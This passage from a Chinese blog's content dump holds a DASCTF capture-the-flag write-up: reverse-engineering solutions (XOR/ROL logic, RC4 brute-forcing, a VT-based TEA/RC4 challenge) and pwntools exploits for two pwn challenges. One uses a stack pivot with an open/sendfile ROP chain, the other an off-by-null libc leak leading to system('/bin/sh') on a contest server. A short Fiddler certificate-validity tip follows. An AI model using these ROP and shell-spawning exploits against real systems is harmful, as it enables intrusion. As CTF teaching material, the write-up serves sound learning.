&#x27;.text:0040147A 74 40 jz short loc_4014BC.text:0040147C 48 dec eax.text:0040147D 33 D2 xor edx, edx.text:0040147F 48 dec eax.text:00401480 B9 04 00 00 00 mov ecx, 4.text:00401480 ; ---------------------------------------------------------------------------.text:00401485 00 db 0.text:00401486 00 db 0.text:00401487 00 db 0.text:00401488 ; ---------------------------------------------------------------------------.text:00401488 00 48 F7 add [eax-9], cl.text:0040148B F1 icebp.text:0040148C 48 dec eax.text:0040148D 8D 1C 25 14 70 40 00 lea ebx, ds:407014h.text:00401494 8A 14 93 mov dl, [ebx+edx*4].text:00401497 48 dec eax.text:00401498 8B 04 25 C8 70 40 00 mov eax, dword_4070C8.text:0040149F 48 dec eax.text:004014A0 8D 1C 25 60 70 40 00 lea ebx, ds:407060h.text:004014A7 8A 0C 03 mov cl, [ebx+eax].text:004014AA 32 CA xor cl, dl.text:004014AC 88 0C 03 mov [ebx+eax], cl.text:004014AF 48 dec eax.text:004014B0 FF C0 inc eax.text:004014B2 48 dec eax.text:004014B3 89 04 25 C8 70 40 00 mov dword_4070C8, eax.text:004014BA EB B2 jmp short loc_40146E.text:004014BC ; ---------------------------------------------------------------------------.text:004014BC.text:004014BC loc_4014BC: ; CODE XREF: .text:0040147A↑j.text:004014BC 44 inc esp.text:004014BD B8 00 70 40 00 mov eax, offset dword_407000.text:004014C2 48 dec eax.text:004014C3 FF 28 jmp fword ptr [eax] main函数扣掉x64的代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp-8h] [ebp-148h] int v5; // [esp-4h] [ebp-144h] int v6; // [esp+0h] [ebp-140h] int v7; // [esp+4h] [ebp-13Ch] char Buf2[44]; // [esp+D0h] [ebp-70h] BYREF int v9; // [esp+FCh] [ebp-44h] int v10; // [esp+100h] [ebp-40h] int v11; // [esp+104h] [ebp-3Ch] int v12; // [esp+108h] [ebp-38h] int v13; // [esp+10Ch] [ebp-34h] int v14; // [esp+110h] [ebp-30h] int v15; // [esp+114h] [ebp-2Ch] int v16; // [esp+118h] [ebp-28h] char v17; // [esp+11Ch] [ebp-24h] int i; // [esp+128h] [ebp-18h] char *v19; // [esp+134h] [ebp-Ch] ((void (*)(void))sub_401000)(); sub_401620(&quot;%99s&quot;, byte_407060); sub_401120(7u, (int)dword_4011D0); dword_407058 -= 559038737; v19 = byte_407060; for ( i = 0; i &lt; 8; ++i ) &#123; *(_DWORD *)&amp;v19[4 * i] += dword_407058; dword_407058 ^= *(_DWORD *)&amp;v19[4 * i]; &#125; MK_FP(*((_WORD *)&amp;byte_40700C + 2), byte_40700C)(byte_407060, 0, v4, v5, v6, v7); sub_401120(7u, (int)dword_401290); v9 = 0; v10 = 0; v11 = 0; v12 = 0; v13 = 0; v14 = 0; v15 = 0; v16 = 0; v17 = 0; Buf2[0] = -86; Buf2[1] = 79; Buf2[2] = 15; Buf2[3] = -30; Buf2[4] = -28; Buf2[5] = 65; Buf2[6] = -103; Buf2[7] = 84; Buf2[8] = 44; Buf2[9] = 43; Buf2[10] = -124; Buf2[11] = 126; Buf2[12] = -68; Buf2[13] = -113; Buf2[14] = -117; Buf2[15] = 120; Buf2[16] = -45; Buf2[17] = 115; Buf2[18] = -120; Buf2[19] = 94; Buf2[20] = -82; Buf2[21] = 71; Buf2[22] = -123; Buf2[23] = 112; Buf2[24] = 49; Buf2[25] = -77; Buf2[26] = 9; Buf2[27] = -50; Buf2[28] = 19; Buf2[29] = -11; Buf2[30] = 13; Buf2[31] = -54; Buf2[32] = 0; if ( !memcmp(byte_407060, Buf2, 0x20u) ) &#123; puts(&quot;Right, flag is DASCTF&#123;your input&#125;&quot;); exit(0); &#125; puts(&quot;Wrong flag&quot;); return 0;&#125; 第一段x64代码 1234567__int64 sub_0()&#123; MEMORY[0x40705C] = NtCurrentPeb()-&gt;BeingDebugged; if ( !MEMORY[0x40705C] ) MEMORY[0x407058] = 1576625838; return MK_FP(MEMORY[0x407008], MEMORY[0x407000])();&#125; 第二段扣掉的x64的代码 1234567891011121314151617181920__int64 __fastcall sub_30(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)&#123; _QWORD *retaddr[2]; // [rsp+8h] [rbp+8h] if ( MEMORY[0x40705C] ) &#123; *retaddr[1] = __ROL8__(*retaddr[1], 32); retaddr[1][1] = __ROL8__(retaddr[1][1], 32); retaddr[1][2] = __ROL8__(retaddr[1][2], 32); retaddr[1][3] = __ROL8__(retaddr[1][3], 32); &#125; else &#123; *retaddr[1] = __ROL8__(*retaddr[1], 12); retaddr[1][1] = __ROL8__(retaddr[1][1], 34); retaddr[1][2] = __ROL8__(retaddr[1][2], 56); retaddr[1][3] = __ROL8__(retaddr[1][3], 14); &#125; return MK_FP(retaddr[0], retaddr[0])(a1, a2, a3, a4, a5);&#125; 第三段扣掉的x64代码 123456789101112__int64 sub_160()&#123; __int64 v0; // rax while ( MEMORY[0x4070C8] != 32i64 ) &#123; v0 = MEMORY[0x4070C8]; *(_BYTE *)(MEMORY[0x4070C8] + 0x407060i64) ^= *(_BYTE *)(4 * (MEMORY[0x4070C8] % 4ui64) + 0x407014); MEMORY[0x4070C8] = v0 + 1; &#125; return MK_FP(MEMORY[0x407008], MEMORY[0x407000])();&#125; 先用magic运算，再ror，再异或 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from Crypto.Util.number import *def ROL(int_value, k, bit=64): bit_string = &#x27;&#123;:0%db&#125;&#x27; % bit bin_value = bit_string.format(int_value) # 8 bit binary bin_value = bin_value[k:] + bin_value[:k] int_value = int(bin_value, 2) return int_value# right circular shiftdef ROR(int_value, k, bit=64): bit_string = &#x27;&#123;:0%db&#125;&#x27; % bit bin_value = bit_string.format(int_value) # 8 bit binary bin_value = bin_value[-k:] + bin_value[:-k] int_value = int(bin_value, 2) return int_value# magic = [0x04,0x77,0x82,0x4a]magic = 0x4a8277044a827704enc = [0x549941E4E20F4FAA, 0x788B8FBC7E842B2C, 0x708547AE5E8873D3, 0xCA0DF513CE09B331]for i in range(len(enc)): enc[i] ^= magicenc[0] = ROR(enc[0],12)enc[1] = ROR(enc[1],34)enc[2] = ROR(enc[2],56)enc[3] = ROR(enc[3],14)magic2 = 0x3ca7259draw = b&#x27;&#x27;print(hex(enc[0]))for i in range(4): raw += long_to_bytes(((enc[i] &amp; 0xffffffff) - magic2 ) % 0x100000000)[::-1] raw += long_to_bytes(((enc[i] &gt;&gt; 32) - (magic2 ^(enc[i] &amp; 0xffffffff)) )% 0x100000000)[::-1] magic2 ^= enc[i] &amp; 0xffffffff magic2 ^= enc[i] &gt;&gt; 32print(raw)# 0x7d5549941e4e20f4# 0x1e4e20f4 babyre所有逻辑在initterm_e里面 initterm_e可以看作init_array 有三个函数，同时按顺序注册了退出函数 第一个函数，限制了输入范围在[0-9] 1234567sub_4025A0(&quot;Input:&quot;, v2);sub_402620(&quot;%99s&quot;, (char)Str);for ( i = 0; i &lt; strlen(Str); ++i )&#123; if ( Str[i] &lt; &#x27;0&#x27; || Str[i] &gt; &#x27;9&#x27; ) ExitProcess(0);&#125; 第二个函数 取反了magic，即变成了”012345678” 12for ( i = 0; i &lt; 8; ++i ) magic1[i] = ~magic1[i]; 第三个函数hook了GetLastError，执行了 1qmemcpy(magic2, &quot;dcbahgfelkjiponm&quot;, sizeof(magic2)); 退出的第一个函数，做了类似base64的编码，base8，每三个字节编码到8个字节，将[16:112]的加密结果进行比对，即知道了[6:42] 12base8_encode(Str, (int)&amp;unk_4081C0);result = memcmp(&amp;unk_4081D0, a16230465152334, 96u);// 915572239428449843076691286116796614 退出的第二个函数，将编码后的结果进行魔改的SHA1? 计算，但是跑一下很久，很奇怪？ 退出的第三个函数，RC4加密 1234rc4_init((sbox, (int)&amp;unk_408182, 6u);rc4_crypt(sbox, (int)&amp;unk_4084C0, 112u);if ( memcmp(&amp;unk_4084C0, byte_408090, 112u) ) ExitProcess(0); 这里的dword_408182正好是输入的字符串str[42:48] 爆rc4密钥反推前6个字节 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;stdio.h&gt;void rc4_init(unsigned char*s,unsigned char*key, unsigned long Len)&#123; int i=0,j=0; //char k[256]=&#123;0&#125;; unsigned char k[256]=&#123;0&#125;; unsigned char tmp=0; for(i=0;i&lt;256;i++) &#123; s[i]=i; k[i]=key[i%Len]; &#125; for(i=0;i&lt;256;i++) &#123; j=(j+s[i]+k[i])%256; tmp=s[i]; s[i]=s[j];//交换s[i]和s[j] s[j]=tmp; &#125;&#125;void rc4_crypt(unsigned char*s,unsigned char*Data,unsigned long Len)&#123; int i=0,j=0,t=0; unsigned long k=0; unsigned char tmp; for(k=0;k&lt;Len;k++) &#123; i=(i+1)%256; j=(j+s[i])%256; tmp=s[i]; s[i]=s[j];//交换s[x]和s[y] s[j]=tmp; t=(s[i]+s[j])%256; Data[k]^=s[t]; &#125;&#125;char payload[112] = &#123;&quot;1423106315032466162304651523346214431471150310701503207116032063140334661543446114434066142304661563446615430464&quot;&#125;;char final[112] = &#123;0&#125;;unsigned char cipher[] =&#123; 0x3F, 0x95, 0xBB, 0xF2, 0x57, 0xF1, 0x7A, 0x5A, 0x22, 0x61, 0x51, 0x43, 0xA2, 0xFA, 0x9B, 0x6F, 0x44, 0x63, 0xC0, 0x08, 0x12, 0x65, 0x5C, 0x8A, 0x8C, 0x4C, 0xED, 0x5E, 0xCA, 0x76, 0xB9, 0x85, 0xAF, 0x05, 0x38, 0xED, 0x42, 0x3E, 0x42, 0xDF, 0x5D, 0xBE, 0x05, 0x8B, 0x35, 0x6D, 0xF3, 0x1C, 0xCF, 0xF8, 0x6A, 0x73, 0x25, 0xE4, 0xB7, 0xB9, 0x36, 0xFB, 0x02, 0x11, 0xA0, 0xF0, 0x57, 0xAB, 0x21, 0xC6, 0xC7, 0x46, 0x99, 0xBD, 0x1E, 0x61, 0x5E, 0xEE, 0x55, 0x18, 0xEE, 0x03, 0x29, 0x84, 0x7F, 0x94, 0x5F, 0xB4, 0x6A, 0x29, 0xD8, 0x6C, 0xE4, 0xC0, 0x9D, 0x6B, 0xCC, 0xD5, 0x94, 0x5C, 0xDD, 0xCC, 0xD5, 0x3D, 0xC0, 0xEF, 0x0C, 0x29, 0xE5, 0xB0, 0x93, 0xF1, 0xB3, 0xDE, 0xB0, 0x70, 0x00&#125;;int main()&#123; for(int i = 0;i&lt;1000000;i++)&#123; char buffer[7] = &#123;0&#125;; // printf(&quot;%06d\\n&quot;,i); sprintf(buffer,&quot;%06d&quot;,i); char sbox[256] = &#123;0&#125;; char raw[112] = &#123;0&#125;; memcpy(raw,payload,112); rc4_init(sbox,buffer,6); rc4_crypt(sbox,(unsigned char*)raw,112); if(!memcmp(raw + 16,cipher +16,0x60))&#123; printf(&quot;%d\\n&quot;,i); rc4_init(sbox,buffer,6); rc4_crypt(sbox,cipher,112); printf(&quot;%s&quot;,cipher); exit(0); &#125; &#125;&#125; 得到正确的结果 128073911523306115230466162304651523346214431471150310701503207116032063140334661543446114434066142304661563446615430464 exp: 123456789101112131415magic = [0xCF, 0xCE, 0xCD, 0xCC, 0xCB, 0xCA, 0xC9, 0xC8]for i in range(len(magic)): magic[i] = 255 - magic[i]print(magic)p = &quot;&quot;sb = &quot;1523306115230466162304651523346214431471150310701503207116032063140334661543446114434066142304661563446615430464&quot;# sb = &quot;162304651523346214431471150310701503207116032063140334661543446114434066142304661563446615430464&quot;flag = &quot;&quot;for i in range(0,len(sb)): p += bin(int(sb[i]))[2:].zfill(3)for i in range(0,len(p),8): flag += chr(int(p[i:i+8],2))print(flag)# 561516915572239428449843076691286116796614807391# 807391 EasyVT驱动部分打开了VT虚拟机，在sub_401C90是#VMExit的处理函数。美化后如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556int sub_401C90()&#123; int VM_EXIT_INSTRUCTION_LEN; // [esp+4h] [ebp-Ch] int VM_EXIT_REASON; // [esp+8h] [ebp-8h] VM_EXIT_REASON = vm_read(0x4402); VM_EXIT_INSTRUCTION_LEN = vm_read(0x440C); guest_eflags = vm_read(26656); guest_esp = vm_read(26652); guest_eip = vm_read(0x681E); switch ( VM_EXIT_REASON ) &#123; case 10: // CPUID handler_CPUID(); break; case 18: // VMCALL handler_VMCALL(); break; case 19: // VMCLEAR sub_F89DB2B0(); break; case 20: // VMLAUNCH sub_F89DB450(); break; case 21: // VMPTRLD sub_F89DB7B0(); break; case 22: // VMPTRST tea_init(); break; case 23: // VMREAD sub_F89DB970(); break; case 24: // VMRESUME TEA tea_enc(); break; case 25: // VMWRITE，这条才是真正的初始化，VMXON,VMCLEAR dont&#x27;care // 但是VMLAUNCH又要初始化一遍RC4 Key sub_F89DBA90(); break; case 26: // VMXOFF cmp(); break; case 27: // VMXON sub_F89DB610(); break; case 28: // Control-register accesses. sub_F89DB1D0(); break; default: break; &#125; vmwrite(0x681E, VM_EXIT_INSTRUCTION_LEN + guest_eip); vmwrite(0x681C, guest_esp); return vmwrite(0x6820, guest_eflags);&#125; 这个处理函数的上层用于设置和恢复环境，vmresume会恢复到虚拟机执行的位置： 12345678910111213141516171819202122232425.text:F89DBC10 mov _guest_eax, eax.text:F89DBC15 mov guest_ecx, ecx.text:F89DBC1B mov guest_edx, edx.text:F89DBC21 mov guest_ebx, ebx.text:F89DBC27 mov guest_esp, esp.text:F89DBC2D mov guest_ebp, ebp.text:F89DBC33 mov guest_esi, esi.text:F89DBC39 mov guest_edi, edi.text:F89DBC3F pushf.text:F89DBC40 pop eax.text:F89DBC41 mov guest_eflags, eax.text:F89DBC46 mov ax, fs.text:F89DBC49 mov fs, ax.text:F89DBC4C mov ax, gs.text:F89DBC4F mov gs, ax.text:F89DBC52 call sub_F89DBC90.text:F89DBC57 mov eax, _guest_eax.text:F89DBC5C mov ecx, guest_ecx.text:F89DBC62 mov edx, guest_edx.text:F89DBC68 mov ebx, guest_ebx.text:F89DBC6E mov esp, guest_esp.text:F89DBC74 mov ebp, guest_ebp.text:F89DBC7A mov esi, guest_esi.text:F89DBC80 mov edi, guest_edi.text:F89DBC86 vmresume 应用程序方面，由于已经在虚拟机内了，执行这些虚拟化指令均会导致#VMExit，执行上述处理函数。 12345678910111213141516171819202122232425.text:00401111 loc_401111: ; CODE XREF: _main+97↓j.text:00401111 mov eax, [ebp-0Ch].text:00401114 add eax, 1.text:00401117 mov [ebp-0Ch], eax.text:0040111A.text:0040111A loc_40111A: ; CODE XREF: _main+4F↑j.text:0040111A cmp dword ptr [ebp-0Ch], 4.text:0040111E jge short loc_401159.text:00401120 mov eax, offset Buffer.text:00401125 mov ecx, [ebp-0Ch].text:00401128 mov esi, [eax+ecx*8].text:0040112B mov edi, [eax+ecx*8+4].text:0040112F vmxon [esp+0DCh+var_DC].text:00401134 vmclear [esp+0DCh+var_DC].text:00401139 vmptrld [esp+0DCh+var_DC].text:0040113D vmwrite eax, ecx.text:00401140 vmlaunch.text:00401143 vmread ecx, eax.text:00401146 vmcall.text:00401149 vmptrst [esp+0DCh+var_DC].text:0040114D vmresume.text:00401150 vmxoff.text:00401153 test eax, eax.text:00401155 jz short loc_40116A.text:00401157 jmp short loc_401111 所以按执行顺序分析#VMExit 的Handler即可。 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;unsigned char e[] =&#123; 0x94, 0x39, 0x07, 0x5C, 0xB3, 0x5C, 0x80, 0x0D, 0x86, 0xA5, 0xDD, 0x87, 0x8E, 0xFB, 0x17, 0x03, 0x29, 0xEF, 0x20, 0x65, 0xAF, 0x87, 0x49, 0x5A, 0xA4, 0xC2, 0x2D, 0xEB, 0x0E, 0x47, 0xCF, 0x38, 0&#125;;void Encrypt(uint32_t *v, uint32_t *k)&#123; uint32_t v0 = v[1], v1 = v[0]; // printf(&quot;0x%x, 0x%x,\\n&quot;, v[0], v[1]); uint32_t sum = 0x20000000 - (32 * 0xC95D6ABF); /* 初始化 */ uint32_t delta = 0xC95D6ABF; /* 密钥调度常数 */ int n = 32; /* 轮数 */ while (n-- &gt; 0) &#123; /* 基本循环开始 */ sum += delta; v0 -= ((v1 &lt;&lt; 4) + k[2]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k[0]); v1 += ((v0 &lt;&lt; 4) + k[1]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k[3]); &#125; /*循环结束*/ v[0] = v0; v[1] = v1;&#125;void Decrypt(uint32_t *v, uint32_t *k)&#123; uint32_t sum, v0 = v[0], v1 = v[1]; int n = 32; /*初始化*/ uint32_t delta = 0xC95D6ABF; /* 密钥调度常数*/ sum = 0x20000000; /*即0xC6EF3720 */ while (n-- &gt; 0) &#123; /*基本循环开始*/ v1 -= ((v0 &lt;&lt; 4) + k[1]) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k[3]); v0 += ((v1 &lt;&lt; 4) + k[2]) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k[0]); sum -= delta; &#125; /*循环结束*/ v[1] = v0; v[0] = v1;&#125;void rc4_init(unsigned char*s,unsigned char*key, unsigned long Len)&#123; int i=0,j=0; //char k[256]=&#123;0&#125;; unsigned char k[256]=&#123;0&#125;; unsigned char tmp=0; for(i=0;i&lt;256;i++) &#123; s[i]=i; k[i]=key[i%Len]; &#125; for(i=0;i&lt;256;i++) &#123; j=(j+s[i]+k[i])%256; tmp=s[i]; s[i]=s[j];//交换s[i]和s[j] s[j]=tmp; &#125;&#125;void rc4_crypt(unsigned char*s,unsigned char*Data,unsigned long Len)&#123; int i=0,j=0,t=0; unsigned long k=0; unsigned char tmp; for(k=0;k&lt;Len;k++) &#123; i=(i+1)%256; j=(j+s[i])%256; tmp=s[i]; s[i]=s[j];//交换s[x]和s[y] s[j]=tmp; t=(s[i]+s[j])%256; Data[k]^=s[t]; &#125;&#125;int main()&#123; //多开一位 不然/0溢出到k了 uint8_t sbox[256] = &#123;0&#125;; uint32_t input[5] = &#123;0&#125;; uint32_t k[4] = &#123; 0x00102030, 0x40506070, 0x8090A0B0, 0xC0D0E0F0&#125;; char key [] = &#123;&quot;04e52c7e31022b0b&quot;&#125;; // Encrypt(input, k); // Encrypt(input + 2, k); // uint32_t enc[4] = &#123;0xda55a5c4, 0x8cccfe38, 0x234d7d23, 0xb63debe2&#125;; uint32_t* enc = (uint32_t*)e; printf(&quot;0x%x, 0x%x,0x%x,0x%x \\n&quot;, enc[0], enc[1], enc[2], enc[3]); printf(&quot;0x%x, 0x%x,0x%x,0x%x \\n&quot;, enc[4], enc[5], enc[6], enc[7]); Encrypt(enc, k); Encrypt(enc + 2, k); Encrypt(enc + 4, k); Encrypt(enc + 6, k); // Encrypt(enc + 8, k); printf(&quot;0x%x, 0x%x,0x%x,0x%x \\n&quot;, enc[0], enc[1], enc[2], enc[3]); printf(&quot;0x%x, 0x%x,0x%x,0x%x \\n&quot;, enc[4], enc[5], enc[6], enc[7]); rc4_init(sbox,key,strlen(key)); rc4_crypt(sbox,enc,8); rc4_init(sbox,key,strlen(key)); rc4_crypt(sbox,enc + 2,8); rc4_init(sbox,key,strlen(key)); rc4_crypt(sbox,enc + 4,8); rc4_init(sbox,key,strlen(key)); rc4_crypt(sbox,enc + 6,8); int tmp = 0; tmp = enc[0]; enc[0] = enc[1]; enc[1] = tmp; tmp = enc[2]; enc[2] = enc[3]; enc[3] = tmp; tmp = enc[4]; enc[4] = enc[5]; enc[5] = tmp; tmp = enc[6]; enc[6] = enc[7]; enc[7] = tmp; puts((char *)enc);&#125; pwn 部分MessageBoard迁移栈到bss段上，执行open + sendfile 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# coding=utf-8import osos.environ[&#x27;PWNLIB_NOTERM&#x27;] = &#x27;True&#x27;from pwn import *context.log_level = &quot;debug&quot;context.terminal = [&#x27;/usr/bin/x-terminal-emulator&#x27;, &#x27;-e&#x27;]context.arch = &quot;amd64&quot;&#x27;&#x27;&#x27;0x0000000000023b6a: pop rdi; ret; &#x27;&#x27;&#x27;pop_rdi = 0x0000000000023b6a&#x27;&#x27;&#x27;0x000000000002601f: pop rsi; ret; &#x27;&#x27;&#x27;pop_rsi = 0x000000000002601f&#x27;&#x27;&#x27;0x0000000000142c92: pop rdx; ret; &#x27;&#x27;&#x27;pop_rdx = 0x0000000000142c92&#x27;&#x27;&#x27;0x000000000010257e: pop rcx; pop rbx; ret; &#x27;&#x27;&#x27;pop_rcx_rbx = 0x000000000010257ep = remote(&quot;tcp.cloud.dasctf.com&quot;,24809)# p = process([&#x27;../xhljmessgeboard&#x27;])elf = ELF(&#x27;../xhljmessgeboard&#x27;)so = ELF(&quot;../libc.so.6&quot;)p.recvuntil(&quot;name:&quot;)p.sendline(&quot;%31$p&quot;)# gdb.attach(p)p.recvuntil(&quot;Hello, &quot;)addr = int(p.recv(14),16) - 243 - so.sym[&#x27;__libc_start_main&#x27;]so.address = addr# addr = u64(p.recv(6).ljust(8,&quot;\\x00&quot;)) - 243 - so.sym[&#x27;__libc_start_main&#x27;]success(&quot;addr =&gt; &quot; + hex(addr))p.send(cyclic(0xb0) + p64(elf.bss(0x150)) + p64(0x401378))payload = &#x27;&#x27;payload += &quot;/flag\\x00\\x00\\x00&quot; + p64(pop_rdi + addr) + p64(elf.bss(0x150) - 0xb0)payload += p64(pop_rsi + addr) + p64(0) + p64(so.sym[&#x27;open&#x27;])payload += p64(pop_rdi + addr ) + p64(1)payload += p64(pop_rsi + addr ) + p64(3)payload += p64(pop_rdx + addr ) + p64(0)payload += p64(pop_rcx_rbx + addr ) + p64(0x7fff) + p64(0)payload += p64(so.sym[&#x27;sendfile&#x27;])payload = payload.ljust(0xb0,&quot;\\x00&quot;)payload += p64(elf.bss(0x150)- 0xb0) + p64(0x4013a2)p.send(payload)p.interactive() babycalcoff-by-null+ 任意写一个字节 1234567for ( i = 0; i &lt;= 15; ++i )&#123; printf(&quot;number-%d:&quot;, (unsigned int)(i + 1)); buf[(int)read(0, buf, 0x100uLL)] = 0; v0 = strtol(buf, 0LL, 10); v3[i] = v0;&#125; z3先上 1234567891011121314151617181920212223242526272829303132333435363738394041424344from z3 import *v5 = Int(&#x27;v5&#x27;)v4 = Int(&#x27;v4&#x27;)v3 = Int(&#x27;v3&#x27;)v6 = Int(&#x27;v6&#x27;)v13 = Int(&#x27;v13&#x27;)v16 = Int(&#x27;v16&#x27;)v8 = Int(&#x27;v8&#x27;)v9 = Int(&#x27;v9&#x27;)v8 = Int(&#x27;v8&#x27;)v7 = Int(&#x27;v7&#x27;)v10 = Int(&#x27;v10&#x27;)v15 = Int(&#x27;v15&#x27;)v18 = Int(&#x27;v18&#x27;)v11 = Int(&#x27;v11&#x27;)v12 = Int(&#x27;v12&#x27;)v14 = Int(&#x27;v14&#x27;)v17 = Int(&#x27;v17&#x27;)s = Solver()s.add(v5 * v4 * v3 - v6 == 36182)s.add(v3 == 19)s.add(v5 * 19 * v4 + v6 == 36322)s.add((v13 + v3 - v8) * v16 == 32835)s.add((v4 * v3 - v5) * v6 == 44170)s.add((v5 + v4 * v3) * v6 == 51590)s.add(v9 * v8 * v7 - v10 == 61549)s.add(v10 * v15 + v4 + v18 == 19037)s.add(v9 * v8 * v7 + v10 == 61871)s.add((v8 * v7 - v9) * v10 == 581693)s.add(v11 == 50)s.add((v9 + v8 * v7) * v10 == 587167)s.add(v13 * v12 * v11 - v14 == 1388499)s.add(v13 * v12 * v11 + v14 == 1388701)s.add((v12 * v11 - v13) * v14 == 640138)s.add((v11 * v5 - v16) * v12 == 321081)s.add((v13 + v12 * v11) * v14 == 682962)s.add(v17 * v16 * v15 - v18 == 563565)s.add(v17 * v16 * v15 + v18 == 563571)s.add(v14 == 101)s.add((v16 * v15 - v17) * v18 == 70374)s.add((v17 + v16 * v15) * v18 == 70518)print(s.check())print(s.model()) 修改返回地址低位到leave; ret;，同时rbp低位被清零，在远程环境下，rsp能刚好落在第一次输入的[0:0x100 - 0x30]附近 1234567891011121314151617181920212223242526272829303132333435363738394041424344# coding=utf-8import osos.environ[&#x27;PWNLIB_NOTERM&#x27;] = &#x27;True&#x27;from pwn import *context.log_level = &quot;debug&quot;context.terminal = [&#x27;/usr/bin/x-terminal-emulator&#x27;, &#x27;-e&#x27;]context.arch = &quot;amd64&quot;# gdb.attach(p)while True: try: p = remote(&quot;tcp.cloud.dasctf.com&quot;, 22492) # p = process([&#x27;../babycalc&#x27;]) elf = ELF(&#x27;../babycalc&#x27;) payload = &quot;24\\x00\\x00&quot; + p32(0) payload += p64(0x0400BB8) * 20 + p64(0x400CA3) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.plt[&#x27;puts&#x27;]) + p64(0x400C1A ) + p64(0x400789) payload += p8(19) + p8(36) + p8(53) + p8(70) + p8(55) + p8(66) + p8(17) + p8(161) payload += p8(50) + p8(131) + p8(212) + p8(101) + p8(118) + p8(199) + p8(24) + p8(3) payload += p32(0x400BB8) * 1 + p64(0x400CA3) + p64(0x602000) + p64(0x4007B4) + p32(0x38) p.send(payload) p.recvuntil(&quot;good done\\n&quot;) puts = u64(p.recv(6).ljust(8,&quot;\\x00&quot;)) success(&quot;puts =&gt; &quot; + hex(puts)) addr = puts - 0x06f6a0 success(&quot;base =&gt; &quot; + hex(addr)) system = puts - 0x06f6a0 + 0x453a0 str_bin_sh = puts - 0x06f6a0 + 0x18ce57 payload = &quot;24\\x00\\x00&quot; + p32(0) # payload += p64(0x0400BB8) * 20 + p64(0x400CA3) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.plt[&#x27;puts&#x27;]) + p64(0x400789) + p64(0x400789) payload += p64(0x0400BB8) * 19 + p64(0x400CA3) + p64(str_bin_sh) +p64(0x0400BB8) + p64(system) + p64( 0x400789) + p64(0x400789) payload += p8(19) + p8(36) + p8(53) + p8(70) + p8(55) + p8(66) + p8(17) + p8(161) payload += p8(50) + p8(131) + p8(212) + p8(101) + p8(118) + p8(199) + p8(24) + p8(3) payload += p32(0x400BB8) * 1 + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.plt[&#x27;puts&#x27;]) + p64(0x400789) + p32(0x38) p.send(payload) p.interactive() except EOFError: continue","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://gy4n.github.io/tags/writeup/"}]},{"title":"fiddler证书有效期时长设置","slug":"fiddler证书有效期时长设置","date":"2021-12-16T01:05:44.000Z","updated":"2023-05-09T08:17:16.131Z","comments":true,"path":"fiddler证书有效期时长设置/","link":"","permalink":"https://gy4n.github.io/fiddler%E8%AF%81%E4%B9%A6%E6%9C%89%E6%95%88%E6%9C%9F%E6%97%B6%E9%95%BF%E8%AE%BE%E7%BD%AE/","excerpt":"chromium 85 以后，2020-09-01 以后签发的HTTPS TLS 证书的有效期最多不超过398天，这导致fiddler默认的根证书无效，无法抓包。 Beginning with Chrome 85, TLS server certificates issued on or after 2020-09-01 00:00:00 UTC will be required to have a validity period of 398 days or less. This will only apply to TLS server certificates from CAs that are trusted in a default installation of Google Chrome, commonly known as “publicly trusted CAs”, and will not apply to locally-operated CAs that have been manually configured. Certificates that do not comply with this requirement will not work, and may cause webpages to fail to load or to render incorrectly. If a certificate that does not comply with this requirement is issued by a CA trusted in a default installation of Google Chrome, this will be treated as a failure to comply with the security policies necessary to being a trusted CA, and may result in the removal of trust of that CA’s certificates. 需要重新配置Fiddler的证书有效期。","text":"chromium 85 以后，2020-09-01 以后签发的HTTPS TLS 证书的有效期最多不超过398天，这导致fiddler默认的根证书无效，无法抓包。 Beginning with Chrome 85, TLS server certificates issued on or after 2020-09-01 00:00:00 UTC will be required to have a validity period of 398 days or less. This will only apply to TLS server certificates from CAs that are trusted in a default installation of Google Chrome, commonly known as “publicly trusted CAs”, and will not apply to locally-operated CAs that have been manually configured. Certificates that do not comply with this requirement will not work, and may cause webpages to fail to load or to render incorrectly. If a certificate that does not comply with this requirement is issued by a CA trusted in a default installation of Google Chrome, this will be treated as a failure to comply with the security policies necessary to being a trusted CA, and may result in the removal of trust of that CA’s certificates. 需要重新配置Fiddler的证书有效期。 打开Fiddler的选项-HTTPS页面，提示证书由CertMaker.dll签发。 把这个CertMaker.dll扔进dnspy里面看一下。 有两个字段控制了证书的生成时间。 在QuickExec 执行 about:config（Fiddler抓包界面下面的命令行）fiddler.certmaker.bc.ee.yearsvalid 是 有效年份fiddler.certmaker.bc.ee.CreatedDaysAgo 是 起始日期这里年份填1，起始日期填-7就行了","categories":[],"tags":[{"name":"Fiddler","slug":"Fiddler","permalink":"https://gy4n.github.io/tags/Fiddler/"}]}],"categories":[],"tags":[{"name":"dotNet","slug":"dotNet","permalink":"https://gy4n.github.io/tags/dotNet/"},{"name":"Debug","slug":"Debug","permalink":"https://gy4n.github.io/tags/Debug/"},{"name":"坑","slug":"坑","permalink":"https://gy4n.github.io/tags/%E5%9D%91/"},{"name":"调试","slug":"调试","permalink":"https://gy4n.github.io/tags/%E8%B0%83%E8%AF%95/"},{"name":"VT","slug":"VT","permalink":"https://gy4n.github.io/tags/VT/"},{"name":"writeup","slug":"writeup","permalink":"https://gy4n.github.io/tags/writeup/"},{"name":"Fiddler","slug":"Fiddler","permalink":"https://gy4n.github.io/tags/Fiddler/"}]}